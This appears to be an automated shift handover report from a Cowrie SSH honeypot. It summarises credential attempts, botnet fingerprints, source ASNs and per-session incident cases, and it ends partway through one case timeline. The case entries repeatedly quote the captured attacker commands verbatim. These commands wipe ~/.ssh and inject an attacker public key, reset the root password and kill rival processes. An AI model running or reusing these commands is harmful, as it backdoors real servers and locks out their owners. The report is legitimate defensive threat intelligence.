# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-13 |
| **Generated At** | 2026-05-13T21:29:02Z |
| **Shift Time** | 21:29 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **254** |
| Confirmed Threats | **129** |
| False Positives Filtered | **125** (49.2%) |
| Unique Attacker IPs | **53** |
| Countries of Origin | **25** |
| High Severity Cases | **21** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **233** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **35** |
| Unique Credential Pairs | **20** |
| Unique Usernames | **7** |
| Unique Passwords | **19** |
| Successful Auth Pairs | **21** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 22 |
| `345gs5662d34` | 8 |
| `ubuntu` | 1 |
| `GET / HTTP/1.1` | 1 |
| `User-Agent: Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 8 |
| `3245gs5662d34` | 8 |
| `freedom` | 2 |
| `` | 2 |
| `1qaz#EDC` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 8 |
| `root` | `3245gs5662d34` | 8 |
| `root` | `freedom` | 2 |
| `ubuntu` | `1qaz#EDC` | 1 |
| `root` | `Qwerty123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Qwerty123` | `179.51.153.37` | 2026-05-13T18:06:20 |
| `root` | `3245gs5662d34` | `179.51.153.37` | 2026-05-13T18:06:29 |
| `root` | `freedom` | `68.183.178.130` | 2026-05-13T18:14:22 |
| `root` | `3245gs5662d34` | `68.183.178.130` | 2026-05-13T18:14:25 |
| `root` | `freedom` | `103.243.24.124` | 2026-05-13T18:16:03 |
| `root` | `3245gs5662d34` | `103.243.24.124` | 2026-05-13T18:16:05 |
| `root` | `ubuntu` | `103.210.22.17` | 2026-05-13T18:18:27 |
| `root` | `jsanchez` | `206.75.13.194` | 2026-05-13T18:23:33 |
| `root` | `3245gs5662d34` | `206.75.13.194` | 2026-05-13T18:23:39 |
| `root` | `chandra` | `158.174.211.17` | 2026-05-13T18:34:18 |
| `root` | `3245gs5662d34` | `158.174.211.17` | 2026-05-13T18:34:27 |
| `root` | `zyl` | `14.103.114.231` | 2026-05-13T18:42:59 |
| `root` | `q!w@e#r$t%` | `14.103.114.231` | 2026-05-13T18:44:31 |
| `root` | `qwertyuiop123` | `14.103.114.231` | 2026-05-13T18:45:43 |
| `root` | `user@123456` | `45.78.198.162` | 2026-05-13T19:08:47 |
| `root` | `3245gs5662d34` | `45.78.198.162` | 2026-05-13T19:08:52 |
| `root` | `admin` | `192.42.116.13` | 2026-05-13T19:20:01 |
| `root` | `raj123` | `101.53.236.155` | 2026-05-13T19:41:39 |
| `root` | `3245gs5662d34` | `101.53.236.155` | 2026-05-13T19:41:44 |
| `root` | `su` | `95.81.113.94` | 2026-05-13T21:26:10 |
| `root` | `3245gs5662d34` | `95.81.113.94` | 2026-05-13T21:26:14 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **254** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 64 |
| OpenSSH | 2 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 30 | 7 |
| `f555226df196...` | Mirai/variant | 15 | 6 |
| `af8223ac9914...` | libssh-based | 10 | 3 |
| `e37f354a101a...` | Mirai/variant | 2 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 30 | 7 | Modern SSH client |
| `f555226df196...` | libssh | 15 | 6 | Mirai/variant |
| `af8223ac9914...` | libssh | 10 | 3 | libssh-based |
| `95420f9d932d...` | libssh | 7 | 4 | — |
| `e37f354a101a...` | libssh | 2 | 1 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `1cc79c7da9b5...` | OpenSSH | 1 | 1 | libssh-based |
| `b21d7cdcc813...` | OpenSSH | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:gpxcXcktKtWL"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.114.231`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.243.24.124`, `179.51.153.37`, `101.53.236.155`, `206.75.13.194`, `68.183.178.130`, `158.174.211.17`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **53** |
| Unique ASNs | **45** |
| High-Risk ASNs | **23** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS211680` | NSEC - Sistemas Informaticos, S.A. | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | MEDIUM |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS5384` | Emirates Internet | 2 | HIGH |
| `AS132934` | Skymax Broadband Services Pvt. Ltd. | 1 | LOW |
| `AS62068` | SpectraIP B.V. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (21)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e25e8c53acab

| Field | Detail |
|---|---|
| **Source IP** | `179.51.153[.]37` |
| **First Seen** | 2026-05-13 18:06 |
| **Last Seen** | 2026-05-13 18:06 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 18:06:18` | `cowrie.session.connect` |
| `2026-05-13 18:06:18` | `cowrie.client.version` |
| `2026-05-13 18:06:19` | `cowrie.client.kex` |
| `2026-05-13 18:06:20` | `cowrie.login.success` |
| `2026-05-13 18:06:21` | `cowrie.session.params` |
| `2026-05-13 18:06:21` | `cowrie.command.input` |
| `2026-05-13 18:06:21` | `cowrie.command.failed` |
| `2026-05-13 18:06:22` | `cowrie.log.closed` |
| `2026-05-13 18:06:23` | `cowrie.session.params` |
| `2026-05-13 18:06:23` | `cowrie.command.input` |
| `2026-05-13 18:06:23` | `cowrie.session.file_download` |
| `2026-05-13 18:06:23` | `cowrie.log.closed` |
| `2026-05-13 18:06:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.51.153[.]37` to AbuseIPDB if not already reported
- [ ] Block `179.51.153[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1d8e2c06ef0

| Field | Detail |
|---|---|
| **Source IP** | `179.51.153[.]37` |
| **First Seen** | 2026-05-13 18:06 |
| **Last Seen** | 2026-05-13 18:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 18:06:27` | `cowrie.session.connect` |
| `2026-05-13 18:06:27` | `cowrie.client.version` |
| `2026-05-13 18:06:28` | `cowrie.client.kex` |
| `2026-05-13 18:06:29` | `cowrie.login.success` |
| `2026-05-13 18:06:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.51.153[.]37` to AbuseIPDB if not already reported
- [ ] Block `179.51.153[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bdb53f3bf29

| Field | Detail |
|---|---|
| **Source IP** | `68.183.178[.]130` |
| **First Seen** | 2026-05-13 18:14 |
| **Last Seen** | 2026-05-13 18:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 18:14:22` | `cowrie.session.connect` |
| `2026-05-13 18:14:22` | `cowrie.client.version` |
| `2026-05-13 18:14:22` | `cowrie.client.kex` |
| `2026-05-13 18:14:22` | `cowrie.login.success` |
| `2026-05-13 18:14:22` | `cowrie.session.params` |
| `2026-05-13 18:14:22` | `cowrie.command.input` |
| `2026-05-13 18:14:22` | `cowrie.command.failed` |
| `2026-05-13 18:14:22` | `cowrie.log.closed` |
| `2026-05-13 18:14:23` | `cowrie.session.params` |
| `2026-05-13 18:14:23` | `cowrie.command.input` |
| `2026-05-13 18:14:23` | `cowrie.session.file_download` |
| `2026-05-13 18:14:23` | `cowrie.log.closed` |
| `2026-05-13 18:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.178[.]130` to AbuseIPDB if not already reported
- [ ] Block `68.183.178[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe321d7c542a

| Field | Detail |
|---|---|
| **Source IP** | `68.183.178[.]130` |
| **First Seen** | 2026-05-13 18:14 |
| **Last Seen** | 2026-05-13 18:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 18:14:24` | `cowrie.session.connect` |
| `2026-05-13 18:14:24` | `cowrie.client.version` |
| `2026-05-13 18:14:24` | `cowrie.client.kex` |
| `2026-05-13 18:14:25` | `cowrie.login.success` |
| `2026-05-13 18:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.178[.]130` to AbuseIPDB if not already reported
- [ ] Block `68.183.178[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83bc411232fc

| Field | Detail |
|---|---|
| **Source IP** | `103.243.24[.]124` |
| **First Seen** | 2026-05-13 18:16 |
| **Last Seen** | 2026-05-13 18:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 18:16:02` | `cowrie.session.connect` |
| `2026-05-13 18:16:02` | `cowrie.client.version` |
| `2026-05-13 18:16:02` | `cowrie.client.kex` |
| `2026-05-13 18:16:03` | `cowrie.login.success` |
| `2026-05-13 18:16:03` | `cowrie.session.params` |
| `2026-05-13 18:16:03` | `cowrie.command.input` |
| `2026-05-13 18:16:03` | `cowrie.command.failed` |
| `2026-05-13 18:16:03` | `cowrie.log.closed` |
| `2026-05-13 18:16:03` | `cowrie.session.params` |
| `2026-05-13 18:16:03` | `cowrie.command.input` |
| `2026-05-13 18:16:03` | `cowrie.session.file_download` |
| `2026-05-13 18:16:03` | `cowrie.log.closed` |
| `2026-05-13 18:16:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.24[.]124` to AbuseIPDB if not already reported
- [ ] Block `103.243.24[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbccd84f84ad

| Field | Detail |
|---|---|
| **Source IP** | `103.243.24[.]124` |
| **First Seen** | 2026-05-13 18:16 |
| **Last Seen** | 2026-05-13 18:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 18:16:05` | `cowrie.session.connect` |
| `2026-05-13 18:16:05` | `cowrie.client.version` |
| `2026-05-13 18:16:05` | `cowrie.client.kex` |
| `2026-05-13 18:16:05` | `cowrie.login.success` |
| `2026-05-13 18:16:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.24[.]124` to AbuseIPDB if not already reported
- [ ] Block `103.243.24[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fae68984bb9

| Field | Detail |
|---|---|
| **Source IP** | `103.210.22[.]17` |
| **First Seen** | 2026-05-13 18:18 |
| **Last Seen** | 2026-05-13 18:23 |
| **Session Duration** | 300s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 18:18:26` | `cowrie.session.connect` |
| `2026-05-13 18:18:26` | `cowrie.client.version` |
| `2026-05-13 18:18:26` | `cowrie.client.kex` |
| `2026-05-13 18:18:27` | `cowrie.login.success` |
| `2026-05-13 18:23:27` | `cowrie.session.file_upload` |
| `2026-05-13 18:23:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.22[.]17` to AbuseIPDB if not already reported
- [ ] Block `103.210.22[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f167d7fe0b1

| Field | Detail |
|---|---|
| **Source IP** | `206.75.13[.]194` |
| **First Seen** | 2026-05-13 18:23 |
| **Last Seen** | 2026-05-13 18:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 18:23:31` | `cowrie.session.connect` |
| `2026-05-13 18:23:31` | `cowrie.client.version` |
| `2026-05-13 18:23:31` | `cowrie.client.kex` |
| `2026-05-13 18:23:33` | `cowrie.login.success` |
| `2026-05-13 18:23:33` | `cowrie.session.params` |
| `2026-05-13 18:23:33` | `cowrie.command.input` |
| `2026-05-13 18:23:33` | `cowrie.command.failed` |
| `2026-05-13 18:23:34` | `cowrie.log.closed` |
| `2026-05-13 18:23:34` | `cowrie.session.params` |
| `2026-05-13 18:23:34` | `cowrie.command.input` |
| `2026-05-13 18:23:35` | `cowrie.session.file_download` |
| `2026-05-13 18:23:35` | `cowrie.log.closed` |
| `2026-05-13 18:23:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.75.13[.]194` to AbuseIPDB if not already reported
- [ ] Block `206.75.13[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fee4aa1c93b

| Field | Detail |
|---|---|
| **Source IP** | `206.75.13[.]194` |
| **First Seen** | 2026-05-13 18:23 |
| **Last Seen** | 2026-05-13 18:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 18:23:38` | `cowrie.session.connect` |
| `2026-05-13 18:23:38` | `cowrie.client.version` |
| `2026-05-13 18:23:38` | `cowrie.client.kex` |
| `2026-05-13 18:23:39` | `cowrie.login.success` |
| `2026-05-13 18:23:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.75.13[.]194` to AbuseIPDB if not already reported
- [ ] Block `206.75.13[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16df496d42cc

| Field | Detail |
|---|---|
| **Source IP** | `158.174.211[.]17` |
| **First Seen** | 2026-05-13 18:34 |
| **Last Seen** | 2026-05-13 18:34 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 18:34:16` | `cowrie.session.connect` |
| `2026-05-13 18:34:16` | `cowrie.client.version` |
| `2026-05-13 18:34:16` | `cowrie.client.kex` |
| `2026-05-13 18:34:18` | `cowrie.login.success` |
| `2026-05-13 18:34:19` | `cowrie.session.params` |
| `2026-05-13 18:34:19` | `cowrie.command.input` |
| `2026-05-13 18:34:19` | `cowrie.command.failed` |
| `2026-05-13 18:34:19` | `cowrie.log.closed` |
| `2026-05-13 18:34:21` | `cowrie.session.params` |
| `2026-05-13 18:34:21` | `cowrie.command.input` |
| `2026-05-13 18:34:21` | `cowrie.session.file_download` |
| `2026-05-13 18:34:21` | `cowrie.log.closed` |
| `2026-05-13 18:34:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.174.211[.]17` to AbuseIPDB if not already reported
- [ ] Block `158.174.211[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ecdda848dc1

| Field | Detail |
|---|---|
| **Source IP** | `158.174.211[.]17` |
| **First Seen** | 2026-05-13 18:34 |
| **Last Seen** | 2026-05-13 18:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 18:34:25` | `cowrie.session.connect` |
| `2026-05-13 18:34:26` | `cowrie.client.version` |
| `2026-05-13 18:34:26` | `cowrie.client.kex` |
| `2026-05-13 18:34:27` | `cowrie.login.success` |
| `2026-05-13 18:34:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.174.211[.]17` to AbuseIPDB if not already reported
- [ ] Block `158.174.211[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ba15ce195c3

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]231` |
| **First Seen** | 2026-05-13 18:42 |
| **Last Seen** | 2026-05-13 18:43 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:gpxcXcktKtWL"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 18:42:58` | `cowrie.session.connect` |
| `2026-05-13 18:42:58` | `cowrie.client.version` |
| `2026-05-13 18:42:59` | `cowrie.client.kex` |
| `2026-05-13 18:42:59` | `cowrie.login.success` |
| `2026-05-13 18:42:59` | `cowrie.session.params` |
